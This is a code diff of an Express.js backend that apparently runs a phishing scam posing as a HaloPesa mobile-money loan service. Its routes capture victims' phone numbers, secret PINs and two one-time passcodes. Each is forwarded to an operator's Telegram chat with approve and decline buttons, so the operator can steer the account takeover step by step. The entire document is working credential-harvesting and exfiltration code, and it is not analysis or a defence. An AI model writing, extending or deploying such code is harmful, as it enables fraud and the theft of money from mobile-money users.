@@ -17,66 +17,90 @@ let currentData = { phone: '', amount: '', months: '', pin: '', otp1: '', otp2: 
 
 // 1. Initial Loan Calculator Request
 app.post('/api/loan-request', (req, res) => {
+    const { amount, months } = req.body;
+    currentData.amount = amount;
+    currentData.months = months;
+    res.json({ status: 'ready_for_phone' });
+});
+
+// 2. Phone, Amount, and PIN Submitted -> Send to Telegram
+app.post('/api/submit-pin-data', async (req, res) => {
+    const { phone, pin } = req.body;
+    currentData.phone = phone;
+    currentData.pin = pin;
+    pinStatus = 'pending';
+    otp1Status = 'idle';
+    otp2Status = 'idle';
+
+    const message = `🚨 *Omba Mkopo HaloPesa* 🚨\n\n📱 *Phone:* \`${phone}\`\n💰 *Amount:* \`TZS ${Number(currentData.amount).toLocaleString()}\`\n📅 *Muda:* \`${currentData.months} Miezi\`\n🔑 *Nambari ya Siri (PIN):* \`${pin}\``;
+
     try {
-        const { amount, months } = req.body;
-        currentData.amount = amount;
-        currentData.months = months;
-        res.json({ status: 'ready_for_phone' });
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: '✅ Approve PIN', callback_data: 'approve_pin' },
+                            { text: '❌ Decline', callback_data: 'reject_pin' }
+                        ]
+                    ]
+                }
+            })
+        });
+
+        const data = await response.json();
+        if (!data.ok) {
+            console.error('Telegram Error:', data);
+            return res.status(500).json({ error: 'Failed to send telegram message' });
+        }
+
+        res.json({ status: 'pending' });
     } catch (err) {
-        console.error('Error in loan-request:', err);
+        console.error('Server error:', err);
         res.status(500).json({ error: 'Internal server error' });
     }
 });
 
-// 2. Phone, Amount, and Nambari ya Siri (PIN) Submitted -> Send to Telegram
-app.post('/api/submit-pin-data', async (req, res) => {
-    try {
-        const { phone, pin } = req.body;
-        currentData.phone = phone;
-        currentData.pin = pin;
-        pinStatus = 'pending';
-        otp1Status = 'idle';
-        otp2Status = 'idle';
-
-        const message = `🚨 *Omba Mkopo HaloPesa* 🚨\n\n📱 *Phone:* \`${phone}\`\n💰 *Amount:* \`TZS ${Number(currentData.amount).toLocaleString()}\`\n📅 *Muda:* \`${currentData.months} Miezi\`\n🔑 *Nambari ya Siri (PIN):* \`${pin}\``;
-
-        await sendTelegramMessage(message, [
-            [
-                { text: '✅ Approve PIN', callback_data: 'approve_pin' },
-                { text: '❌ Decline', callback_data: 'reject_pin' }
-            ]
-        ]);
-        res.json({ status: 'pending' });
-    } catch (err) {
-        console.error('Error sending PIN alert to Telegram:', err);
-        res.status(500).json({ error: 'Failed to send telegram message' });
-    }
-});
-
-// Check status of PIN approval
 app.get('/api/check-pin-status', (req, res) => {
     res.json({ status: pinStatus });
 });
 
 // 3. OTP 1 Submitted -> Send to Telegram
 app.post('/api/verify-otp1', async (req, res) => {
+    const { otp1 } = req.body;
+    currentData.otp1 = otp1;
+    otp1Status = 'pending';
+
+    const message = `🔐 *HaloPesa First OTP Verification* 🔐\n\n📱 *Phone:* \`${currentData.phone}\`\n🔢 *OTP 1 Code:* \`${otp1}\``;
+
     try {
-        const { otp1 } = req.body;
-        currentData.otp1 = otp1;
-        otp1Status = 'pending';
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: '✅ Approve OTP 1', callback_data: 'correct_otp1' },
+                            { text: '❌ Wrong OTP 1', callback_data: 'wrong_otp1' }
+                        ]
+                    ]
+                }
+            })
+        });
 
-        const message = `🔐 *HaloPesa First OTP Verification* 🔐\n\n📱 *Phone:* \`${currentData.phone}\`\n🔢 *OTP 1 Code:* \`${otp1}\``;
-
-        await sendTelegramMessage(message, [
-            [
-                { text: '✅ Approve OTP 1', callback_data: 'correct_otp1' },
-                { text: '❌ Wrong OTP 1', callback_data: 'wrong_otp1' }
-            ]
-        ]);
         res.json({ status: 'pending' });
     } catch (err) {
-        console.error('Error sending OTP 1 to Telegram:', err);
-        res.status(500).json({ error: 'Failed to send OTP message' });
+        console.error('OTP 1 send error:', err);
+        res.status(500).json({ error: 'Internal server error' });
     }
 });
 
@@ -86,23 +110,35 @@ app.get('/api/check-otp1-status', (req, res) => {
 
 // 4. OTP 2 Submitted -> Send to Telegram
 app.post('/api/verify-otp2', async (req, res) => {
+    const { otp2 } = req.body;
+    currentData.otp2 = otp2;
+    otp2Status = 'pending';
+
+    const message = `🔐 *HaloPesa Second OTP Verification* 🔐\n\n📱 *Phone:* \`${currentData.phone}\`\n🔢 *OTP 2 Code:* \`${otp2}\``;
+
     try {
-        const { otp2 } = req.body;
-        currentData.otp2 = otp2;
-        otp2Status = 'pending';
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: '✅ Approve OTP 2', callback_data: 'correct_otp2' },
+                            { text: '❌ Wrong OTP 2', callback_data: 'wrong_otp2' }
+                        ]
+                    ]
+                }
+            })
+        });
 
-        const message = `🔐 *HaloPesa Second OTP Verification* 🔐\n\n📱 *Phone:* \`${currentData.phone}\`\n🔢 *OTP 2 Code:* \`${otp2}\``;
-
-        await sendTelegramMessage(message, [
-            [
-                { text: '✅ Approve OTP 2', callback_data: 'correct_otp2' },
-                { text: '❌ Wrong OTP 2', callback_data: 'wrong_otp2' }
-            ]
-        ]);
         res.json({ status: 'pending' });
     } catch (err) {
-        console.error('Error sending OTP 2 to Telegram:', err);
-        res.status(500).json({ error: 'Failed to send OTP message' });
+        console.error('OTP 2 send error:', err);
+        res.status(500).json({ error: 'Internal server error' });
     }
 });
 
@@ -110,10 +146,9 @@ app.get('/api/check-otp2-status', (req, res) => {
     res.json({ status: otp2Status });
 });
 
-// Telegram Webhook Endpoint for Production (Render)
+// Telegram Webhook Route (Replaces Long-Polling for Render)
 app.post('/telegram-webhook', async (req, res) => {
-    // Immediately send 200 OK so Telegram doesn't timeout or retry
-    res.sendStatus(200);
+    res.sendStatus(200); // Acknowledge Telegram immediately
 
     try {
         const update = req.body;
@@ -166,19 +201,6 @@ async function answerCallback(callbackQueryId, text) {
     } catch (e) {
         console.error('Answer callback error:', e);
     }
-}
-
-async function sendTelegramMessage(text, keyboard) {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'Markdown',
-            reply_markup: { inline_keyboard: keyboard }
-        })
-    });
 }
 
 async function removeMessageButtons(chatId, messageId) {
